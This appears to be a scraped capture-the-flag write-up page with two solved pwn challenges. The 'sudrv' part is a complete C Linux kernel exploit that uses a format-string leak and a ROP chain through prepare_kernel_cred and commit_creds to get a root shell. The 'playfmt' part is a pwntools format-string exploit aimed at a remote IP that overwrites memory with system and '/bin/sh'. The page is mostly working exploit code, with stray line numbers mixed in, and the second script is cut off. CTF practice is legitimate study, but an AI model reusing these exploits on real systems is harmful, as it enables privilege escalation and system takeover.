68
69
70
71
72
73
select query from tablename;
sudrv
Status: solved
Tags: Pwn
sudrv
nc home.sslab.cc 45030
https://coding.net/u/ImageMLT/p/pwn/git/tree/master
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#define ALLOC_SIZE 168
#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void get_shell(void){
    execve("/bin/sh",0,0);
}
void su_print(int fd)
{
  ioctl(fd,0xDEADBEEF);
}
void su_malloc(int fd,int size)
{
  ioctl(fd,0x73311337,size);
}
void su_free(int fd)
{
  ioctl(fd,0x13377331);
}
unsigned long user_cs, user_ss, user_eflags,user_sp ;
void save_stats() {
  asm(
    "movq %%cs, %0\n"
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
    "movq %%ss, %1\n"
    "movq %%rsp, %3\n"
    "pushfq\n"
    "popq %2\n"
    :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
    :
    : "memory"
  );
}
void get_shell_again(){
  char *shell = "/bin/sh";
  char *args[] = {shell, NULL};
  execve(shell, args, NULL);
}
int main()
{ 
  setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
  signal(SIGSEGV,get_shell_again);
  int fd1 = open("/dev/meizijiutql",O_RDWR);
  char format[150]=
"0x%llx0x%llx0x%llx0x%llx0x%llx0x%lx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0
x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx0x%llx\n";
  char buf1[100]="aaaaaaaa";
  unsigned long long poprdi;
  unsigned long long poprdx;
  unsigned long long vmbase ; 
  unsigned long long iretq ;
  unsigned long long swapgs ;
  unsigned long long rop[0x30];
  su_malloc(fd1,ALLOC_SIZE);
  write(fd1,format,150);
  su_print(fd1);  
  su_free(fd1);
  char addr[16];
  write(1,"stack addr:(ed8)   \n",20);
  scanf("%llx",(long long *)addr);
  *(long long *)addr -=0x88;
  write(1,"vmlinux addr:(268) \n",20);
  scanf("%llx",&vmbase);
  vmbase = (vmbase -19505768) - 0xFFFFFFFF81000000;
  printf("%llx",vmbase);
  prepare_kernel_cred = vmbase + 0xFFFFFFFF81081790;
  commit_creds = vmbase + 0xFFFFFFFF81081410;
  swapgs = vmbase + 0xffffffff81a00d5a;
  iretq = vmbase + 0xffffffff81021762;
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
playfmt
Status: solved
Tags: Pwn
  poprdi = vmbase + 0xffffffff81001388;
  poprdx = vmbase + 0xffffffff81044f17;
  unsigned long long pushrax= vmbase +0xffffffff812599a8; 
  unsigned long long poprbx = vmbase +0xffffffff81000926;
  unsigned long long callrbx = vmbase+0xffffffff81a001ea;
  sleep(1);
  save_stats();
  rop[0]=poprdi;
  rop[1]=0;
  rop[2]=prepare_kernel_cred;
  rop[3]=pushrax;
  rop[4]=0;
  rop[5]=0;
  rop[6]=0;
  rop[7]=poprbx;
  rop[8]=poprdx;
  rop[9]=callrbx;
  rop[10]=commit_creds;
  rop[11]=swapgs;
  rop[12]=0x246;
  rop[13]=iretq;
  rop[14]= (size_t)&get_shell;
  rop[15] = user_cs;
  rop[16] = user_eflags;
  rop[17] = user_sp;
  rop[18] = user_ss;
  rop[19] = 0;
  char mem[0xc0+0x10];
  memset(mem,0x41,0xd0);
  memcpy(mem+0xc0,addr,0x10);
  write(1,mem,0xd0);
  su_malloc(fd1,ALLOC_SIZE);
  write(fd1,mem,0xd0);
  su_malloc(fd1,ALLOC_SIZE);
  write(fd1,buf1,100);
  su_malloc(fd1,ALLOC_SIZE);
  write(fd1,(char*)rop,180);
  su_malloc(fd1,ALLOC_SIZE);
  write(fd1,(char*)rop,180);
}
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
#!python
1
#-*- coding: utf-8 -*-
#@Date: 2019-08-17 21:54:18
from pwn import *
s = lambda x:p.send(x) 
r = lambda  :p.recv()
rs = lambda  :p.recvuntil(" ")
#p = process('./playfmt')
p = remote('120.78.192.35',9999)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc =ELF('./libc.6')
r()
# leaking libc,stack
s("%23$p %6$p \n")
pause()
libc.address = int(rs(),16)-0x18637
log.info("libc.address:"+hex(libc.address))
stack = int(rs(),16)
log.info("stack:"+hex(stack))
tmp = (stack-0x1c)&0xffff
r()
s("%{0}c%6$hn".format(str(tmp)).ljust(0xc8,'\x00'))
p.recv()
tmp = tmp&0xff
for i in range(4):
    payload = "%{0}c%6$hhn".format(str(tmp+i)).ljust(0xc8,'\x00')
    s(payload)
    r()
    payload = "%{0}c%14$hhn".format(str(((libc.sym['system']>>
(8*i))&0xff))).ljust(0xc8,'\x00')
    s(payload)
    r()
binsh = next(libc.search('/bin/sh'))
log.info("binsh:"+hex(binsh))
for i in range(4):
    payload = "%{0}c%6$hhn".format(str(tmp+i+8)).ljust(0xc8,'\x00')
    s(payload)
    r()
    payload = "%{0}c%14$hhn".format(str(((binsh>>
(8*i))&0xff))).ljust(0xc8,'\x00')
    s(payload)
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16